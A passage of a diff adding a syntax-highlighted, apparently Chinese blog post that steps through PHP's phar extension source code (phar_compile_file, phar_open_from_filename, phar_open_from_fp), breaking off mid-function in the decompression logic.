+</span></span><span style="display:flex;"><span>							<span style="color:#66d9ef">if</span> (file_handle<span style="color:#f92672">-&gt;</span>handle.stream.closer <span style="color:#f92672">&amp;&amp;</span> file_handle<span style="color:#f92672">-&gt;</span>handle.stream.handle) {
+</span></span><span style="display:flex;"><span>								file_handle<span style="color:#f92672">-&gt;</span>handle.stream.<span style="color:#a6e22e">closer</span>(file_handle<span style="color:#f92672">-&gt;</span>handle.stream.handle);
+</span></span><span style="display:flex;"><span>							}
+</span></span><span style="display:flex;"><span>							file_handle<span style="color:#f92672">-&gt;</span>handle.stream.handle <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>							<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>							<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>					}
+</span></span><span style="display:flex;"><span>					<span style="color:#f92672">*</span>file_handle <span style="color:#f92672">=</span> f;
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (phar<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> PHAR_FILE_COMPRESSION_MASK) {
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">/* compressed phar */</span>
+</span></span><span style="display:flex;"><span>				file_handle<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">=</span> ZEND_HANDLE_STREAM;
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">/* we do our own reading directly from the phar, don&#39;t change the next line */</span>
+</span></span><span style="display:flex;"><span>				file_handle<span style="color:#f92672">-&gt;</span>handle.stream.handle  <span style="color:#f92672">=</span> phar;
+</span></span><span style="display:flex;"><span>				file_handle<span style="color:#f92672">-&gt;</span>handle.stream.reader  <span style="color:#f92672">=</span> phar_zend_stream_reader;
+</span></span><span style="display:flex;"><span>				file_handle<span style="color:#f92672">-&gt;</span>handle.stream.closer  <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>				file_handle<span style="color:#f92672">-&gt;</span>handle.stream.fsizer  <span style="color:#f92672">=</span> phar_zend_stream_fsizer;
+</span></span><span style="display:flex;"><span>				file_handle<span style="color:#f92672">-&gt;</span>handle.stream.isatty  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>				phar<span style="color:#f92672">-&gt;</span>is_persistent <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">php_stream_rewind</span>(<span style="color:#a6e22e">PHAR_G</span>(cached_fp)[phar<span style="color:#f92672">-&gt;</span>phar_pos].fp) <span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">php_stream_rewind</span>(phar<span style="color:#f92672">-&gt;</span>fp);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	zend_try {
+</span></span><span style="display:flex;"><span>		failed <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CG</span>(zend_lineno) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>		res <span style="color:#f92672">=</span> <span style="color:#a6e22e">phar_orig_compile_file</span>(file_handle, type);
+</span></span><span style="display:flex;"><span>	} zend_catch {
+</span></span><span style="display:flex;"><span>		failed <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>		res <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	} <span style="color:#a6e22e">zend_end_try</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (name) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">zend_string_release</span>(name);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (failed) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">zend_bailout</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> res;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* }}} */</span>
+</span></span></code></pre></div><p>只要文件名中包含<code>.phar</code>且不含<code>://</code>就会调用phar_open_from_filename：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">phar_open_from_filename</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>fname, <span style="color:#66d9ef">size_t</span> fname_len, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>alias, <span style="color:#66d9ef">size_t</span> alias_len, <span style="color:#66d9ef">uint32_t</span> options, phar_archive_data<span style="color:#f92672">**</span> pphar, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>error) <span style="color:#75715e">/* </span>{{{ <span style="color:#960050;background-color:#1e0010">*/</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	php_stream <span style="color:#f92672">*</span>fp;
+</span></span><span style="display:flex;"><span>	zend_string <span style="color:#f92672">*</span>actual;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret, is_data <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (error) {
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">*</span>error <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strstr</span>(fname, <span style="color:#e6db74">&#34;.phar&#34;</span>)) {
+</span></span><span style="display:flex;"><span>		is_data <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">phar_open_parsed_phar</span>(fname, fname_len, alias, alias_len, is_data, options, pphar, error) <span style="color:#f92672">==</span> SUCCESS) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> SUCCESS;
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (error <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>error) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FAILURE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">php_check_open_basedir</span>(fname)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FAILURE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">php_stream_open_wrapper</span>(fname, <span style="color:#e6db74">&#34;rb&#34;</span>, IGNORE_URL<span style="color:#f92672">|</span>STREAM_MUST_SEEK, <span style="color:#f92672">&amp;</span>actual);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>fp) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (options <span style="color:#f92672">&amp;</span> REPORT_ERRORS) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (error) {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">spprintf</span>(error, <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;unable to open phar for reading </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>, fname);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (actual) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">zend_string_release_ex</span>(actual, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FAILURE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (actual) {
+</span></span><span style="display:flex;"><span>		fname <span style="color:#f92672">=</span> <span style="color:#a6e22e">ZSTR_VAL</span>(actual);
+</span></span><span style="display:flex;"><span>		fname_len <span style="color:#f92672">=</span> <span style="color:#a6e22e">ZSTR_LEN</span>(actual);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span>  <span style="color:#a6e22e">phar_open_from_fp</span>(fp, fname, fname_len, alias, alias_len, options, pphar, is_data, error);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (actual) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">zend_string_release_ex</span>(actual, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* }}}*/</span>
+</span></span></code></pre></div><p>phar_open_from_fp：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">phar_open_from_fp</span>(php_stream<span style="color:#f92672">*</span> fp, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>fname, <span style="color:#66d9ef">size_t</span> fname_len, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>alias, <span style="color:#66d9ef">size_t</span> alias_len, <span style="color:#66d9ef">uint32_t</span> options, phar_archive_data<span style="color:#f92672">**</span> pphar, <span style="color:#66d9ef">int</span> is_data, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>error) <span style="color:#75715e">/* </span>{{{ <span style="color:#960050;background-color:#1e0010">*/</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> token[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;__HALT_COMPILER();&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> zip_magic[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;PK</span><span style="color:#ae81ff">\x03\x04</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> gz_magic[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1f\x8b\x08</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> bz_magic[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;BZh&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pos, test <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> recursion_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>; <span style="color:#75715e">// arbitrary limit to avoid too deep or even infinite recursion
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> window_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">1024</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(token)]; <span style="color:#75715e">/* a 1024 byte window + the size of the halt_compiler token (moving window) */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> zend_long readsize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(buffer) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(token);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> zend_long tokenlen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(token) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	zend_long halt_offset;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">size_t</span> got;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> compression <span style="color:#f92672">=</span> PHAR_FILE_COMPRESSED_NONE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (error) {
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">*</span>error <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">php_stream_rewind</span>(fp)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;cannot rewind phar </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	buffer[<span style="color:#66d9ef">sizeof</span>(buffer)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(buffer, <span style="color:#ae81ff">32</span>, <span style="color:#66d9ef">sizeof</span>(token));
+</span></span><span style="display:flex;"><span>	halt_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* Maybe it&#39;s better to compile the file instead of just searching,  */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* but we only want the offset. So we want a .re scanner to find it. */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">php_stream_eof</span>(fp)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ((got <span style="color:#f92672">=</span> <span style="color:#a6e22e">php_stream_read</span>(fp, buffer<span style="color:#f92672">+</span>tokenlen, readsize)) <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">size_t</span>) tokenlen) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;internal corruption of phar </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> (truncated entry)&#34;</span>)
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>test <span style="color:#f92672">&amp;&amp;</span> recursion_count) {
+</span></span><span style="display:flex;"><span>			test <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\1&#39;</span>;
+</span></span><span style="display:flex;"><span>			pos <span style="color:#f92672">=</span> buffer<span style="color:#f92672">+</span>tokenlen;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">memcmp</span>(pos, gz_magic, <span style="color:#ae81ff">3</span>)) {
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">char</span> err <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>				php_stream_filter <span style="color:#f92672">*</span>filter;
+</span></span><span style="display:flex;"><span>				php_stream <span style="color:#f92672">*</span>temp;
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">/* to properly decompress, we have to tell zlib to look for a zlib or gzip header */</span>
+</span></span><span style="display:flex;"><span>				zval filterparams;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">PHAR_G</span>(has_zlib)) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;unable to decompress gzipped phar archive </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> to temporary file, enable zlib extension in php.ini&#34;</span>)
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">array_init</span>(<span style="color:#f92672">&amp;</span>filterparams);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* this is defined in zlib&#39;s zconf.h */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifndef MAX_WBITS
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_WBITS 15
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#a6e22e">add_assoc_long_ex</span>(<span style="color:#f92672">&amp;</span>filterparams, <span style="color:#e6db74">&#34;window&#34;</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#e6db74">&#34;window&#34;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, MAX_WBITS <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">/* entire file is gzip-compressed, uncompress to temporary file */</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(temp <span style="color:#f92672">=</span> <span style="color:#a6e22e">php_stream_fopen_tmpfile</span>())) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;unable to create temporary file for decompression of gzipped phar archive </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_rewind</span>(fp);
+</span></span><span style="display:flex;"><span>				filter <span style="color:#f92672">=</span> <span style="color:#a6e22e">php_stream_filter_create</span>(<span style="color:#e6db74">&#34;zlib.inflate&#34;</span>, <span style="color:#f92672">&amp;</span>filterparams, <span style="color:#a6e22e">php_stream_is_persistent</span>(fp));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>filter) {
+</span></span><span style="display:flex;"><span>					err <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">add_assoc_long_ex</span>(<span style="color:#f92672">&amp;</span>filterparams, <span style="color:#e6db74">&#34;window&#34;</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#e6db74">&#34;window&#34;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, MAX_WBITS);
+</span></span><span style="display:flex;"><span>					filter <span style="color:#f92672">=</span> <span style="color:#a6e22e">php_stream_filter_create</span>(<span style="color:#e6db74">&#34;zlib.inflate&#34;</span>, <span style="color:#f92672">&amp;</span>filterparams, <span style="color:#a6e22e">php_stream_is_persistent</span>(fp));
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">zend_array_destroy</span>(<span style="color:#a6e22e">Z_ARR</span>(filterparams));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>filter) {
+</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">php_stream_close</span>(temp);
+</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;unable to decompress gzipped phar archive </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">, ext/zlib is buggy in PHP versions older than 5.2.6&#34;</span>)
+</span></span><span style="display:flex;"><span>					}
+</span></span><span style="display:flex;"><span>				} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">zend_array_destroy</span>(<span style="color:#a6e22e">Z_ARR</span>(filterparams));
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_filter_append</span>(<span style="color:#f92672">&amp;</span>temp<span style="color:#f92672">-&gt;</span>writefilters, filter);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (SUCCESS <span style="color:#f92672">!=</span> <span style="color:#a6e22e">php_stream_copy_to_stream_ex</span>(fp, temp, PHP_STREAM_COPY_ALL, NULL)) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">php_stream_filter_remove</span>(filter, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (err) {
+</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">php_stream_close</span>(temp);
+</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;unable to decompress gzipped phar archive </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">, ext/zlib is buggy in PHP versions older than 5.2.6&#34;</span>)
+</span></span><span style="display:flex;"><span>					}
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">php_stream_close</span>(temp);
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;unable to decompress gzipped phar archive </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> to temporary file&#34;</span>)
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_filter_flush</span>(filter, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_filter_remove</span>(filter, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_close</span>(fp);
+</span></span><span style="display:flex;"><span>				fp <span style="color:#f92672">=</span> temp;
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_rewind</span>(fp);
+</span></span><span style="display:flex;"><span>				compression <span style="color:#f92672">=</span> PHAR_FILE_COMPRESSED_GZ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">/* now, start over */</span>
+</span></span><span style="display:flex;"><span>				test <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!--</span>recursion_count) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;unable to decompress gzipped phar archive </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">memcmp</span>(pos, bz_magic, <span style="color:#ae81ff">3</span>)) {
+</span></span><span style="display:flex;"><span>				php_stream_filter <span style="color:#f92672">*</span>filter;
+</span></span><span style="display:flex;"><span>				php_stream <span style="color:#f92672">*</span>temp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">PHAR_G</span>(has_bz2)) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;unable to decompress bzipped phar archive </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> to temporary file, enable bz2 extension in php.ini&#34;</span>)
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#75715e">/* entire file is bzip-compressed, uncompress to temporary file */</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(temp <span style="color:#f92672">=</span> <span style="color:#a6e22e">php_stream_fopen_tmpfile</span>())) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;unable to create temporary file for decompression of bzipped phar archive </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_rewind</span>(fp);
+</span></span><span style="display:flex;"><span>				filter <span style="color:#f92672">=</span> <span style="color:#a6e22e">php_stream_filter_create</span>(<span style="color:#e6db74">&#34;bzip2.decompress&#34;</span>, NULL, <span style="color:#a6e22e">php_stream_is_persistent</span>(fp));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>filter) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">php_stream_close</span>(temp);
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;unable to decompress bzipped phar archive </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">, filter creation failed&#34;</span>)
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_filter_append</span>(<span style="color:#f92672">&amp;</span>temp<span style="color:#f92672">-&gt;</span>writefilters, filter);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (SUCCESS <span style="color:#f92672">!=</span> <span style="color:#a6e22e">php_stream_copy_to_stream_ex</span>(fp, temp, PHP_STREAM_COPY_ALL, NULL)) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">php_stream_filter_remove</span>(filter, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">php_stream_close</span>(temp);
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">MAPPHAR_ALLOC_FAIL</span>(<span style="color:#e6db74">&#34;unable to decompress bzipped phar archive </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> to temporary file&#34;</span>)
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_filter_flush</span>(filter, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">php_stream_filter_remove</span>(filter, <span style="color:#ae81ff">1</span>);
